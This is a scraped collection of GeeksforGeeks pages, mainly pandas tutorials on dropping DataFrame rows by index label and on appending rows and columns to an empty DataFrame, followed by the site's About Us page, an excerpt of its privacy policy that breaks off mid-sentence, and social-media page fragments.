Using jQuery?How to add table row in a table using jQuery?How to remove table row from table using jQuery ?Create a Form Dynamically using Dform and jQueryHow to dynamically set the height and width of a div element using jQuery ?How to handle events in dynamically created elements in jQuery ?Space between two rows in a table using CSS?How to sort rows in a table using JavaScript?How to remove the table row in a table using JavaScript ?How create table without using <table> tag ?Design a table using table tag and its attributesHTML | DOM Table rows CollectionHow to remove all rows from a table in JavaScript ?How to fix the height of rows in the table?How to apply CSS page-break to print a table with lots of rows?Dynamically generating a QR code using PHPHow to change style attribute of an element dynamically using JavaScript ?How to create an image element dynamically using JavaScript ?How to dynamically change the title of web page using JavaScript ?vasundharashuklaCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : CSSHTMLJQueryWeb TechnologiesWeb technologies QuestionsCSS-MiscHTML-MiscjQuery-Misc Practice Tags : HTML thumb_up 1 To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page How to define a part of text in an alternate voice or mood using HTML5 ? Next last_page How to Create Text Reveal Effect for Buttons using HTML and CSS ? Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in CSS How to Create Time-Table schedule using HTML ?How to update Node.js and NPM to next version ?Types of CSS (Cascading Style Sheet)CSS | :not(:last-child):after SelectorHow to Upload Image into Database and Display it using PHP ? Most visited in HTML How to Create Time-Table schedule using HTML ?HTML | colspan AttributeHow to set input type date in dd-mm-yyyy format using HTML ?How to set the default value for an HTML <select> element?Hide or show elements in HTML using display property room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

How to drop rows in Pandas DataFrame by index labels? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Drop rows from the dataframe based on certain condition applied on a columnHow to Drop rows in DataFrame by conditions on column values?How to drop rows in Pandas DataFrame by index labels?Python | Delete rows/columns from DataFrame using Pandas.drop()How to drop one or multiple columns in Pandas DataframeDecimal Functions in Python | Set 2 (logical_and(), normalize(), quantize(), rotate() … )NetworkX : Python software package for study of complex networksDirected Graphs, Multigraphs and Visualization in NetworkxPython | Visualize graphs generated in NetworkX using MatplotlibVisualize Graphs in PythonGraph Plotting in Python | Set 1Graph Plotting in Python | Set 2Graph Plotting in Python | Set 3Plotting graph using Seaborn | PythonBox plot visualization with Pandas and SeabornBox Plot in Python using MatplotlibHow to get column names in Pandas dataframePython program to find number of days between two given datesPython | Difference between two dates (in minutes) using datetime.timedelta() methodPython | datetime.timedelta() functionComparing dates in PythonPython | Convert string to DateTime and vice-versaConvert the column type from string to datetime format in Pandas dataframeAdding new column to existing DataFrame in PandasCreate a new column in Pandas DataFrame based on the existing columnsPython map() functionTaking input in PythonIterate over a list in PythonEnumerate() in Python How to drop rows in Pandas DataFrame by index labels? Last Updated: 02-07-2020 Pandas provide data analysts a way to delete and filter data frame using .drop() method. Rows can be removed using index label or column name using this method. Syntax: DataFrame.drop(labels=None, axis=0, index=None, columns=None, level=None, inplace=False, errors=’raise’) Parameters: labels: String or list of strings referring row or column name. axis: int or string value, 0 ‘index’ for Rows and 1 ‘columns’ for Columns. index or columns: Single label or list. index or columns are an alternative to axis and cannot be used together. level: Used to specify level in case data frame is having multiple level index. inplace: Makes changes in original Data Frame if True. errors: Ignores error if any value from the list doesn’t exists and drops rest of the values when errors = ‘ignore’ Return type: Dataframe with dropped values Now, Let’s create a sample dataframe filter_none edit close play_arrow link brightness_4 code # import pandas library import pandas as pd # dictionary with list object in values details = { 'Name' : ['Ankit', 'Aishwarya', 'Shaurya','Shivangi'], 'Age' : [23, 21, 22,21], 'University' : ['BHU', 'JNU', 'DU', 'BHU'], } # creating a Dataframe object df = pd.DataFrame(details,columns = ['Name','Age','University'], index = ['a', 'b', 'c', 'd']) df chevron_right filter_none Output: Example #1: Delete a single Row in DataFrame by Row Index Label filter_none edit close play_arrow link brightness_4 code # import pandas library import pandas as pd # dictionary with list object in values details = { 'Name' : ['Ankit', 'Aishwarya', 'Shaurya', 'Shivangi'], 'Age' : [23, 21, 22, 21], 'University' : ['BHU', 'JNU', 'DU', 'BHU'], } # creating a Dataframe object df = pd.DataFrame(details, columns = ['Name', 'Age', 'University'], index = ['a', 'b', 'c', 'd']) # return a new dataframe by dropping a # row 'c' from dataframe update_df = df.drop('c') update_df chevron_right filter_none Output : Example #2: Delete Multiple Rows in DataFrame by Index Labels filter_none edit close play_arrow link brightness_4 code # import pandas library import pandas as pd # dictionary with list object in values details = { 'Name' : ['Ankit', 'Aishwarya', 'Shaurya', 'Shivangi'], 'Age' : [23, 21, 22, 21], 'University' : ['BHU', 'JNU', 'DU', 'BHU'], } # creating a Dataframe object df = pd.DataFrame(details, columns = ['Name', 'Age', 'University'], index = ['a', 'b', 'c', 'd']) # return a new dataframe by dropping a row # 'b' & 'c' from dataframe update_df = df.drop(['b', 'c']) update_df chevron_right filter_none Output : Example #3: Delete a Multiple Rows by Index Position in DataFrame filter_none edit close play_arrow link brightness_4 code # import pandas library import pandas as pd # dictionary with list object in values details = { 'Name' : ['Ankit', 'Aishwarya', 'Shaurya', 'Shivangi'], 'Age' : [23, 21, 22, 21], 'University' : ['BHU', 'JNU', 'DU', 'BHU'], } # creating a Dataframe object df = pd.DataFrame(details, columns = ['Name', 'Age', 'University'], index = ['a', 'b', 'c', 'd']) # return a new dataframe by dropping a row # 'b' & 'c' from dataframe using their # respective index position update_df = df.drop([df.index[1], df.index[2]]) update_df chevron_right filter_none Output : Example #4: Delete rows from dataFrame in Place filter_none edit close play_arrow link brightness_4 code # import pandas library import pandas as pd # dictionary with list object in values details = { 'Name' : ['Ankit', 'Aishwarya', 'Shaurya', 'Shivangi'], 'Age' : [23, 21, 22, 21], 'University' : ['BHU', 'JNU', 'DU', 'BHU'], } # creating a Dataframe object df = pd.DataFrame(details, columns = ['Name', 'Age', 'University'], index = ['a', 'b', 'c', 'd']) # droppping a row 'c' & 'd' from actual dataframe df.drop(['c', 'd'], inplace = True ) df chevron_right filter_none Output : Attention geek! Strengthen your foundations with the Python Programming Foundation Course and learn the basics. To begin with, your interview preparations Enhance your Data Structures concepts with the Python DS Course. My Personal Notes arrow_drop_up Save Recommended Posts:Python | Delete rows/columns from DataFrame using Pandas.drop()How to Drop Rows with NaN Values in Pandas DataFrame?Drop rows from Pandas dataframe with missing values or NaN in columnsDrop a list of rows from a Pandas DataFrameDrop rows from the dataframe based on certain condition applied on a columnHow to Drop rows in DataFrame by conditions on column values?How to get rows/index names in Pandas dataframeGet minimum values in rows or columns with their index position in Pandas-DataframeSelect Rows & Columns by Name or Index in Pandas DataFrame using [ ], loc & ilocConvert given Pandas series into a dataframe with its index as another column on the dataframeDrop columns in DataFrame by label Names or by Index PositionsHow to drop one or multiple columns in Pandas DataframeHow to Find & Drop duplicate columns in a Pandas DataFrame?How to Drop Columns with NaN Values in Pandas DataFrame?Python | Pandas Index.drop()How to randomly select rows from Pandas DataFrameGet all rows in a Pandas DataFrame containing given substringDifferent ways to iterate over rows in Pandas DataframeSelecting rows in pandas DataFrame based on conditionsHow to iterate over rows in Pandas DataframeankthonCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : PythonPython pandas-dataFramePython pandas-dataFrame-methodsPython-pandas thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Drop rows from Pandas dataframe with missing values or NaN in columns Next last_page Implement Canny Edge Detector in Python using OpenCV Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Python Python program to convert a list to stringRead a file line by line in PythonPython String | replace()Reading and Writing to text files in Pythonappend() and extend() in Python More related articles in Python Python String | split()sum() function in PythonConvert integer to string in PythonDeque in Pythonfloor() and ceil() function Python room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

How to create an empty DataFrame and append rows & columns to it in Pandas? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ How to create an empty DataFrame and append rows & columns to it in Pandas?Python – Pandas dataframe.append()Python program to find number of days between two given datesPython | Difference between two dates (in minutes) using datetime.timedelta() methodPython | datetime.timedelta() functionComparing dates in PythonPython | Convert string to DateTime and vice-versaConvert the column type from string to datetime format in Pandas dataframeAdding new column to existing DataFrame in PandasCreate a new column in Pandas DataFrame based on the existing columnsPython | Creating a Pandas dataframe column based on a given conditionSelecting rows in pandas DataFrame based on conditionsPython | Pandas DataFrame.where()Python | Pandas Series.str.find()Get all rows in a Pandas DataFrame containing given substringPython | Pandas Series.str.contains()Python String find()Python | Find position of a character in given stringPython String | replace()replace() in Python to replace a substringPython | Replace substring in list of stringsPython – Replace Substrings from String ListPython map() functionTaking input in PythonIterate over a list in PythonEnumerate() in PythonHow to get column names in Pandas dataframePython program to convert a list to stringReading and Writing to text files in Python How to create an empty DataFrame and append rows & columns to it in Pandas? Last Updated: 02-07-2020 Let’s discuss how to create an empty DataFrame and append rows & columns to it in Pandas. There are multiple ways in which we can do this task. Method #1: Create a complete empty DataFrame without any column name or indices and then appending columns one by one to it. filter_none edit close play_arrow link brightness_4 code # import pandas library as pd import pandas as pd # create an Empty DataFrame object df = pd.DataFrame() print(df) # append columns to an empty DataFrame df['Name'] = ['Ankit', 'Ankita', 'Yashvardhan'] df['Articles'] = [97, 600, 200] df['Improved'] = [2200, 75, 100] df chevron_right filter_none Output: Method #2: Create an empty DataFrame with columns name only then appending rows one by one to it using append() method. filter_none edit close play_arrow link brightness_4 code # import pandas library as pd import pandas as pd # create an Empty DataFrame # object With column names only df = pd.DataFrame(columns = ['Name', 'Articles', 'Improved']) print(df) # append rows to an empty DataFrame df = df.append({'Name' : 'Ankit', 'Articles' : 97, 'Improved' : 2200}, ignore_index = True) df = df.append({'Name' : 'Aishwary', 'Articles' : 30, 'Improved' : 50}, ignore_index = True) df = df.append({'Name' : 'yash', 'Articles' : 17, 'Improved' : 220}, ignore_index = True) df chevron_right filter_none Output: Method #3: Create an empty DataFrame with a column name and indices and then appending rows one by one to it using loc[] method. filter_none edit close play_arrow link brightness_4 code # import pandas library as pd import pandas as pd # create an Empty DataFrame object With # column names and indices df = pd.DataFrame(columns = ['Name', 'Articles', 'Improved'], index = ['a', 'b', 'c']) print("Empty DataFrame With NaN values : \n\n", df) # adding rows to an empty # dataframe at existing index df.loc['a'] = ['Ankita', 50, 100] df.loc['b'] = ['Ankit', 60, 120] df.loc['c'] = ['Harsh', 30, 60] df chevron_right filter_none Output: Attention geek! Strengthen your foundations with the Python Programming Foundation Course and learn the basics. To begin with, your interview preparations Enhance your Data Structures concepts with the Python DS Course. My Personal Notes arrow_drop_up Save Recommended Posts:Append data to an empty Pandas DataFrameDealing with Rows and Columns in Pandas DataFrameIterating over rows and columns in Pandas DataFrameGet the number of rows and number of columns in Pandas DataframeFind maximum values & position in columns and rows of a Dataframe in PandasCount the number of rows and columns of a Pandas dataframeCount the number of rows and columns of Pandas dataframePython | Delete rows/columns from DataFrame using Pandas.drop()Drop rows from Pandas dataframe with missing values or NaN in columnsApply a function to single or selected columns or rows in Pandas DataframeSort rows or columns in Pandas Dataframe based on valuesGet minimum values in rows or columns with their index position in Pandas-DataframeSelect Rows & Columns by Name or Index in Pandas DataFrame using [ ], loc & ilocCreate a new column in Pandas DataFrame based on the existing columnsCreate empty dataframe in PandasCreate a list from rows in Pandas dataframeCreate a list from rows in Pandas DataFrame | Set 2Find duplicate rows in a Dataframe based on all or selected columnsPython - Pandas dataframe.append()How to append a list as a row to a Pandas DataFrame in Python?ankthonCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : PythonPython pandas-dataFramePython-pandas thumb_up 2 To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Loop or Iterate over all or certain columns of a dataframe in Python-Pandas Next last_page Get the number of rows and number of columns in Pandas Dataframe Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Python Read a file line by line in PythonPython Dictionaryappend() and extend() in PythonPython String | split()Different ways to create Pandas Dataframe More related articles in Python Python ListsPython | Get a list as input from userPrint lists in Python (4 Different Ways)GET and POST requests using Pythonisupper(), islower(), lower(), upper() in Python and their applications room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GeeksforGeeks - मुखपृष्ठ | Facebook येथे जाया पृष्ठावरील विभागप्रवेशक्षमता मदतहा मेनू उघडण्यासाठी alt + / दाबाFacebookईमेल किंवा फोनपासवर्डखाते विसरलात?२.१ लाख अनुसरणकर्तेOfficial facebook page of GeeksforGeeks.org. All the posts, blog news will be updated here.मुखपृष्ठलाइव्हव्हिडिओकार्यक्रमपोस्‍ट्सयाबद्दलसमुदायछायाचित्रेबद्दल GEEKSFORGEEKSGeeksforGeeksGeeksforGeeks - Your one-stop destination to attain “Coding Nirvana”अधिक पहासमुदायसर्व पहा२,०८,५९१ लोकांना हे आवडले२,१२,७३४ लोक याचे अनुसरण करतातपृष्‍ठ पारदर्शकताअधिक पहापृष्ठाचा उद्देश आणखी चांगल्या प्रकारे जाणून घेण्यात मदत करण्यासाठी Facebook माहिती दाखवत आहे. सामग्री व्यवस्थापित आणि पोस्ट करणाऱ्या लोकांनी केलेल्या कृती पहा.SANCHHAYA EDUCATION PRIVATE LIMITED या पेजसाठी जबाबदार आहे.लोक२,०८,५९१ आवडलेसंबंधित पृष्ठेHackerRankइंटरनेट कंपनीHackerEarthइंटरनेट कंपनीCoding Ninjasमाहिती तंत्रज्ञान कंपनीGeeksforGeeks Practiceशिक्षणCoding Blocksशिक्षणGeeksforGeeksअभियांत्रिकी सेवाCode Jamसंगणक कंपनीStack Overflowस्वारस्यPrepBytesशिक्षणCodeNation Innovation Labsसॉफ्टवेअर कंपनीGoogle Studentsशिक्षणAlgorithms with Rachit Jainशिक्षणInterviewBitसंगणक कंपनीTopcoderइंटरनेट कंपनीjavatpoint.comशैक्षणिक वेबसाइटProgramming Buddy ClubशाळाInternshalaशिक्षणSPOJवेबसाइटStudytonightशैक्षणिक वेबसाइटGUVIशैक्षणिक वेबसाइटअधिक पहाtriangle-downया पृष्ठाकडून पसंत केलेली पृष्ठेGeeksforGeeks PracticeCampus Geeks Connect - GeeksforGeeksGeeksQuizमराठी · हिन्दी · اردو · ગુજરાતી · English (UK)गोपनीयता · अटी · जाहिराती · जाहिरात निवड · कुकीज · आणखी Facebook © 2020छायाचित्रेसर्व पहाआणखी पहा

Page Not Found • Instagram Instagram Log in Error Please wait a few minutes before you try again. About us Support Press API Jobs Privacy Terms © 2020 Instagram

AboutPressCopyrightContact usCreatorAdvertiseDevelopersTermsPrivacyPolicy & SafetyHow YouTube worksTest new features© 2020 Google LLCGeeksforGeeks - YouTube

About us - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ About Us Welcome to the world of Geeks!! How many times were you frustrated while looking out for a good collection of programming/algorithm/interview questions? What did you expect and what did you get? This portal has been created to provide well written, well thought and well explained solutions for selected questions. Team Sandeep Jain An IIT Roorkee alumnus and founder of GeeksforGeeks. He loves to solve programming problems in most efficient ways. Apart from GeeksforGeeks, he has worked with DE Shaw and Co. as a software developer and JIIT Noida as an assistant professor. Shikhar Goel A Computer Science graduate who likes to make things simpler. When he's not working, you can find him surfing the web, learning facts, tricks and life hacks. He also enjoys movies in his leisure time. Dharmesh Singh A software developer who is always trying to push boundaries in search of great breakthroughs. Off from his desk, you can find him cheering up his buddies and enjoying life. Shubham Baranwal A passionate developer who always tries to learn new technology and software. In his free time, either he reads some articles or learns some other stuff. Major Contributors/Advisors Venki: An engineer graduated in ECE stream from GITAM, passionate about computers and problem solving. His interests include Algos & DS, Mathematics, Puzzles, Operating Systems, C++, Web/Big Data and reading regional Telugu literature. Connect him on LinkedIn, Facebook and Personal Blog. Aashish Barnwal: A CS Engineer pursuing graduation from KIIT University, Bhubaneswar, passionate about coding in most efficient way. My areas of interest include Data Structure & Algorithms, Compiler, Problem Solving, Mathematics and Puzzles. Facebook profile: http://www.facebook.com/barnwal.aashish Narendra Kangralkar: An IT engineer graduated from Pune. I mostly spend my time with Linux and sharing resourceful knowledge with others. I also enjoy reading technical magazines and Marathi novels. My areas of interests includes Algorithms and Data-structures, Operating System, Linux system programming and Shell scripting. Anurag Singh: A CSE Engineer, graduated from NIT Calicut. Interests include Algorithms and Data Structures, Mathematics, Geographic Information Systems, Java/C/C++/Shell Scripting/Web. Facebook: https://www.facebook.com/anurag.x.singh, Linkedin: https://www.linkedin.com/in/anuragxsingh Gautham: EEE graduate from NIT Warangal. Gautham no longer contributes to GeekstoGeeks. Currently working on a new initiative PPprep. room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Privacy Policy - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Privacy Policy Application Privacy Statement We Sanchhaya Education Pvt. Ltd., are registered and headquartered at BC 227, 2nd Floor, Matrix Business Tower, B4, Sector 132, Noida, UP-201301, hereinafter referred to as GeeksforGeeks. We also offer paid Courses managed by Sanchhaya Classes Pvt. Ltd. with registered office address B-142, Vishwash Park, Uttam Nagar, New Delhi, North Delhi, Delhi, India, 110059. At GeeksforGeeks, we value your trust & respect your privacy. This privacy statement (“Privacy Statement”) applies to the treatment of personally identifiable information submitted by, or otherwise obtained from, you in connection with the associated application (“Application”). The Application is provided by GeeksforGeeks (and may be provided by Geeksforgeeks on behalf of a GeeksforGeeks licensor or partner (“Application Partner”). By using or otherwise accessing the Application, you acknowledge that you accept the practices and policies outlined in this Privacy Statement. Information Collection and Use Log Files Like many other Web sites, GeeksforGeeks may receive and store any information you submit to the Application (or otherwise authorize us to obtain – such as, from (for example) your Facebook account). These files merely logs visitors to the site – usually a standard procedure for hosting companies and a part of hosting services’ analytics. The information inside the log files includes internet protocol (IP) addresses, browser type, Internet Service Provider (ISP), date/time stamp, referring/exit pages, and possibly the number of clicks. This information is used to analyze trends, administer the site, track user’s movement around the site, and gather demographic information. IP addresses, and other such information are not linked to any information that is personally identifiable. Cookies and Web BeaconsGeeksforGeeks uses cookies and browser’s local storage to store information about visitors’ 